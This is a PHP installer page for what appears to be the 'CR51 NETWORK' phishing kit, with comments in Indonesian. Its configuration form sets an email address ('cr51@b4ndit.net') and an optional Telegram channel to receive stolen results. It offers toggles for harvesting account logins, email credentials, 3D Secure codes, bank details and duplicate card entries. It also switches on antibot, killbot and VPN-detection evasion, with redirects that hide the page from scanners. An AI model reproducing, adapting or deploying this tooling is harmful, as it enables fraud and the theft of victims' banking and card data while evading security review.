<?php
// Script ini dibuat oleh Team CR51 NETWORK
// Dimohon Jangan Hapus Copyright Kami
// Jika Anda Ingin Mengembangkan Silahkan, Kami Tidak Akan Menggugat Anda
// Salam Dari Inisial MH

session_start();
if (is_file('../CR51/Brain/.settings.ini')) {
  header('Location: /panel/login');
  exit();
}
ini_set('max_execution_time', 300);
if (isset($_POST['gass'])) {
  $result           = $_POST["result"];
  $parameter           = $_POST["parameter"];
  $redirect           = $_POST["redirect"];
  $antibot           = $_POST["antibot"];
  $killbot           = $_POST["killbot"];
  $getaccount           = $_POST["getaccount"];
  $vpndetect           = $_POST["vpndetect"];
  $getemail           = $_POST["getemail"];
  $get3dscure           = $_POST["get3dscure"];
  $getbank          = $_POST["getbank"];
  $doubleemail           = $_POST["doubleemail"];
  $telegram         = $_POST["telegram"];
  $doublecard          = $_POST["doublecard"];

  if (empty($result && $parameter && $redirect && $telegram && $antibot && $killbot && $getaccount && $vpndetect && $getemail && $get3dscure && $getbank && $doubleemail && $doublecard)) {
    $_SESSION["sukses"] = 'swal("Error!", "Please input all fields.", "error");';
    $_SESSION['tampil'] = 'js-active';
    $_SESSION['tmp'] = 'js-active';
    $_SESSION['hide'] = 'hide';
    header('Location: /');
    exit();
  }
  if (filter_var($result, FILTER_VALIDATE_EMAIL) === false) {
    $_SESSION["sukses"] = 'swal("Error!", "Please input a valid result email.", "error");';
    $_SESSION['tampil'] = 'js-active';
    $_SESSION['tmp'] = 'js-active';
    $_SESSION['hide'] = 'hide';
    header('Location: /');
    exit();
  }

  $f = fopen("../CR51/Brain/.settings.ini", "w");
  $R1 = substr(str_shuffle('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'), 0, 6);
  $R2 = substr(str_shuffle('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'), 0, 6);
  $R3 = substr(str_shuffle('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'), 0, 6);
  $license = 'CR51-' . $R1 . '-' . $R2 . '-' . $R3 . '';
  $domain = 'https://' . $_SERVER['SERVER_NAME'];
  setcookie('token', $license, time() + (86400 * 30), "/");
  setcookie('panel', $domain . '/?panel', time() + (86400 * 30), "/");
  setcookie('linksc', $domain . '/?' . $parameter, time() + (86400 * 30), "/");
  setcookie('copyright', 'CR51 NETWORK', time() + (86400 * 30), "/");
  fwrite($f, "TOKEN = \"$license\"\nRESULT = \"$result\"\nPARAMETER = \"$parameter\"\nTelegram = \"$telegram\"\nNOTFOUND = \"$redirect\"\nANTIBOT = \"$antibot\"\nKILLBOT = \"$killbot\"\nGETACCOUNT = \"$getaccount\"\nVPNDETECT = \"$vpndetect\"\nGETEMAIL = \"$getemail\"\nGET3DSCURE = \"$get3dscure\"\nGETBANK = \"$getbank\"\nDOUBLEEMAIL = \"$doubleemail\"\nDOUBLECARD = \"$doublecard\"\n");
  fclose($f);
  rename("data/cr51.htaccess", "../.htaccess");
  $_SESSION["sukses"] = 'swal("Good job!", "Installation successful.", "success");';
  header('Location: /panel/finished');
  exit();
}
$phpversionsuccess = false;
$curlsuccess = false;
$displayerrorssuccess = false;
$zliboutputcompressionsuccess = false;
$timezonesuccess = false;
$phprequired = "7.4";
$phpversion = PHP_VERSION;
if (version_compare($phpversion, $phprequired) >= 0) {
  $phpversionsuccess = true;
}
if (function_exists("curl_version")) {
  $curlsuccess = true;
}
if (ini_get('display_errors')) {
  $displayerrorssuccess = true;
}
if (ini_get('zlib.output_compression')) {
  $zliboutputcompressionsuccess = true;
}
$timezonesettings = ini_get('date.timezone');
if ($timezonesettings) {
  $timezonesuccess = true;
}
if ($phpversionsuccess && $curlsuccess && $timezonesuccess && $displayerrorssuccess && $zliboutputcompressionsuccess) {
  $all_requirement_success = true;
} else {
  $all_requirement_success = false;
}
$writeable_directories = array(
  'CR51' => '/CR51',
  'CR51Brain' => '/CR51/Brain'
);
foreach ($writeable_directories as $value) {
  if (!is_writeable(".." . $value)) {
    $all_requirement_success = false;
  }
}
$dashboardurl = $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'];
$dashboardurl = preg_replace('/install.*/', '', $dashboardurl);
if (!empty($_SERVER['HTTPS'])) {
  $dashboardurl = 'https://' . $dashboardurl;
} else {
  $dashboardurl = 'http://' . $dashboardurl;
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>CR51 NETWORK - INSTALATIONS</title>
  <link href="https://fonts.googleapis.com/css?family=Poppins:400,600&display=swap" rel="stylesheet">
  <link href='https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/css/bootstrap.min.css' rel='stylesheet'>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/7.33.1/sweetalert2.min.css" rel="stylesheet">
  <link href="../CR51/Assets/css/cr51.install.style.css" rel="stylesheet">
</head>

<body>
  <header class="header">
    <h1 class="txtcr51">CR51 NETWORK</h1>
    <h1 class="header__title">INSTALLATIONS</h1>
  </header>
  <div class="content">
    <div class="content__inner">
      <div class="container overflow-hidden">
        <div class="multisteps-form">
          <div class="row">
            <div class="col-12 col-lg-8 ml-auto mr-auto mb-4">
              <div class="multisteps-form__progress">
                <button class="multisteps-form__progress-btn js-active" title="Pre-Installation" disabled>Pre-Installation</button>
                <button class="multisteps-form__progress-btn <?php echo @$_SESSION['tampil'] ? $_SESSION['tampil'] : ''; ?><?php unset($_SESSION['tampil']); ?>" title="Configuration" disabled>Configuration</button>
                <button class="multisteps-form__progress-btn" title="Finished" disabled>Finished</button>
              </div>
            </div>
          </div>
          <div class="row">
            <div class="col-12 col-lg-8 m-auto">
              <form action="" method="POST" class="multisteps-form__form">
                <div class="multisteps-form__panel shadow p-4 rounded bg-white <?php echo @$_SESSION['hide'] ? $_SESSION['hide'] : 'js-active'; ?><?php unset($_SESSION['hide']); ?>" data-animation="slideHorz">
                  <div class="multisteps-form__content">
                    <div class="form-row mt-4">
                      <div class="col">
                        <p>1. Please configure your PHP settings to match following requirements:</p>
                        <hr />
                        <table>
                          <thead>
                            <tr>
                              <th>PHP Settings</th>
                              <th>Current Version</th>
                              <th>Required Version</th>
                              <th>Status</th>
                            </tr>
                          </thead>
                          <tbody>
                            <tr>
                              <td>PHP Version</td>
                              <td><?php echo $phpversion; ?></td>
                              <td><?php echo $phprequired; ?>+</td>
                              <td>
                                <?php if ($phpversionsuccess) { ?>
                                  <p class="biru">active</p>
                                <?php } else { ?>
                                  <p class="merah">not active</p>
                                <?php } ?>
                              </td>
                            </tr>
                          </tbody>
                        </table>
                      </div>
                    </div>
                    <div class="form-row mt-4">
                      <div class="col">
                        <p>2. Please make sure the extensions/settings listed below are installed/enabled:</p>
                        <hr />
                        <table>
                          <thead>
                            <tr>
                              <th>PHP Settings</th>
                              <th>Current Version</th>
                              <th>Required Version</th>
                              <th>Status</th>
                            </tr>
                          </thead>

                          <tbody>
                            <tr>
                              <td>cURL</td>
                              <td> <?php if ($curlsuccess) { ?>
                                  On
                                <?php } else { ?>
                                  Off
                                <?php } ?>
                              </td>
                              <td>On</td>
                              <td>
                                <?php if ($curlsuccess) { ?>
                                  <p class="biru">active</p>
                                <?php } else { ?>
                                  <p class="merah">not active</p>
                                <?php } ?>
                              </td>
                            </tr>
                            <tr>
                              <td>display_errors</td>
                              <td> <?php if ($displayerrorssuccess) { ?>
                                  On
                                <?php } else { ?>
                                  Off
                                <?php } ?>
                              </td>
                              <td>On</td>
                              <td>
                                <?php if ($displayerrorssuccess) { ?>
                                  <p class="biru">active</p>
                                <?php } else { ?>
                                  <p class="merah">not active</p>
                                <?php } ?>
                              </td>
                            </tr>
                            <tr>
                              <td>zlib.output_compression</td>
                              <td> <?php if ($zliboutputcompressionsuccess) { ?>
                                  On
                                <?php } else { ?>
                                  Off
                                <?php } ?>
                              </td>
                              <td>On</td>
                              <td>
                                <?php if ($zliboutputcompressionsuccess) { ?>
                                  <p class="biru">active</p>
                                <?php } else { ?>
                                  <p class="merah">not active</p>
                                <?php } ?>
                              </td>
                            </tr>
                            <tr>
                              <td>date.timezone</td>
                              <td> <?php if ($timezonesuccess) {
                                      echo $timezonesettings;
                                    } else {
                                      echo "Null";
                                    } ?>
                              </td>
                              <td>Timezone</td>
                              <td>
                                <?php if ($timezonesuccess) { ?>
                                  <p class="biru">active</p>
                                <?php } else { ?>
                                  <p class="merah">not active</p>
                                <?php } ?>
                              </td>
                            </tr>
                          </tbody>
                        </table>
                      </div>
                    </div>
                    <div class="form-row mt-4">
                      <div class="col">
                        <p>3. Please make sure you have set the <strong>writable</strong> permission on the
                          following folders/files:</p>
                        <hr />
                        <table>
                          <tbody>
                            <?php
                            foreach ($writeable_directories as $value) {
                            ?>
                              <tr>
                                <td><?php echo $value; ?></td>
                                <td>
                                  <?php if (is_writeable(".." . $value)) { ?>
                                    <p class="biru">file exists</p>
                                  <?php
                                  } else {
                                    $all_requirement_success = false;
                                  ?>
                                    <p class="merah">file not exists</p>
                                  <?php } ?>
                                </td>
                              </tr>
                            <?php
                            }
                            ?>
                          </tbody>
                        </table>
                      </div>
                    </div>
                    <div class="button-row d-flex mt-4">
                      <button <?php
                              if (!$all_requirement_success) {
                                echo "disabled=disabled";
                              }
                              ?> class="btn btn-primary ml-auto js-btn-next" type="button" title="Next">Next</button>
                    </div>
                  </div>
                </div>
                <div class="multisteps-form__panel shadow p-4 rounded bg-white <?php echo @$_SESSION['tmp'] ? $_SESSION['tmp'] : 'hide'; ?><?php unset($_SESSION['tmp']); ?>" data-animation="slideHorz">
                  <h3 class="multisteps-form__title">Your Configuration</h3>
                  <div class="multisteps-form__content">
                    <div class="form-row mt-4">
                      <div class="col">
                        <label>Email Result</label>
                        <input class="multisteps-form__input form-control" type="text" name="result" value="cr51@b4ndit.net" />
                      </div>
                    </div>
                    <div class="form-row mt-4">
                      <div class="col">
                        <label>Parameter</label>
                        <input class="multisteps-form__input form-control" type="text" name="parameter" value="verify" />
                      </div>
                    </div>
                    <div class="form-row mt-4">
                      <div class="col-12 col-sm-3 mt-4 mt-sm-0">
                        <label>Redirect</label>
                        <select name="redirect" class="form-control">
                          <option selected="selected" value="404">404</option>
                          <option value="custom">Custom</option>
                          <option value="google">Google</option>
                        </select>
                      </div>
                      <div class="col-12 col-sm-3 mt-4 mt-sm-0">
                        <label>Result Telegram</label>
                        <select name="telegram" class="form-control">
                          <option selected="selected" value="off">Off</option>
                          <option value="on">On</option>
                        </select>
                      </div>
                      <div class="col-6 col-sm-3 mt-4 mt-sm-0">
                        <label>AntiBots</label>
                        <select name="antibot" class="form-control">
                          <option selected="selected" value="off">Off</option>
                          <option value="on">On</option>
                        </select>
                      </div>
                      <div class="col-6 col-sm-3 mt-4 mt-sm-0">
                        <label>KillBots</label>
                        <select name="killbot" class="form-control">
                          <option selected="selected" value="off">Off</option>
                          <option value="on">On</option>
                        </select>
                      </div>
                    </div>
                    <div class="form-row mt-4">
                      <div class="col-12 col-sm-3 mt-4 mt-sm-0">
                        <label>GET ACCOUNT</label>
                        <select name="getaccount" class="multisteps-form__select form-control">
                          <option selected="selected" value="off">Off</option>
                          <option value="on">On</option>
                        </select>
                      </div>
                      <div class="col-6 col-sm-3 mt-4 mt-sm-0">
                        <label>VPN DETECT</label>
                        <select name="vpndetect" class="multisteps-form__select form-control">
                          <option selected="selected" value="off">Off</option>
                          <option value="on">On</option>
                        </select>
                      </div>
                      <div class="col-6 col-sm-3 mt-4 mt-sm-0">
                        <label>GET EMAIL</label>
                        <select name="getemail" class="multisteps-form__select form-control">
                          <option selected="selected" value="off">Off</option>
                          <option value="on">On</option>
                        </select>
                      </div>
                      <div class="col-6 col-sm-3 mt-4 mt-sm-0">
                        <label>GET 3DSCURE</label>
                        <select name="get3dscure" class="multisteps-form__select form-control">
                          <option selected="selected" value="off">Off</option>
                          <option value="on">On</option>
                        </select>
                      </div>
                    </div>
                    <div class="form-row mt-4">
                      <div class="col-12 col-sm-3 mt-4 mt-sm-0">
                        <label>GET BANK</label>
                        <select name="getbank" class="multisteps-form__select form-control">
                          <option selected="selected" value="off">Off</option>
                          <option value="on">On</option>
                        </select>
                      </div>
                      <div class="col-6 col-sm-3 mt-4 mt-sm-0">
                        <label>GET PAP ID</label>
                        <select class="multisteps-form__select form-control" disabled>
                          <option selected="selected" value="off">Off</option>
                          <option value="on">On</option>
                        </select>
                      </div>
                      <div class="col-6 col-sm-3 mt-4 mt-sm-0">
                        <label>DOUBLE EMAIL</label>
                        <select name="doubleemail" class="multisteps-form__select form-control">
                          <option selected="selected" value="off">Off</option>
                          <option value="on">On</option>
                        </select>
                      </div>
                      <div class="col-6 col-sm-3 mt-4 mt-sm-0">
                        <label>DOUBLE CARD</label>
                        <select name="doublecard" class="multisteps-form__select form-control">
                          <option selected="selected" value="off">Off</option>
                          <option value="on">On</option>
                        </select>
                      </div>
                    </div>
                    <div class="button-row d-flex mt-4">
                      <button class="btn btn-primary js-btn-prev" type="button" title="Prev">Prev</button>
                      <button class="btn btn-primary ml-auto" <?php
                                                              if (!$all_requirement_success) {
                                                                echo "disabled=disabled";
                                                              }
                                                              ?> name="gass" type="submit" title="Install">INSTALL</button>
                    </div>
                  </div>
                </div>
              </form>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ho+j7jyWK8fNQe+A12Hb8AhRq26LrZ/JpcUGGOn+Y7RsweNrtN/tE3MoK7ZeZDyx" crossorigin="anonymous"></script>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/7.33.1/sweetalert2.min.js"></script>
  <script src="../CR51/Assets/js/cr51.install.script.js"></script>
  <?php if (@$_SESSION['sukses']) { ?>
    <script>
      <?php echo $_SESSION['sukses']; ?>
    </script>
  <?php unset($_SESSION['sukses']);
  } ?>
</body>

</html>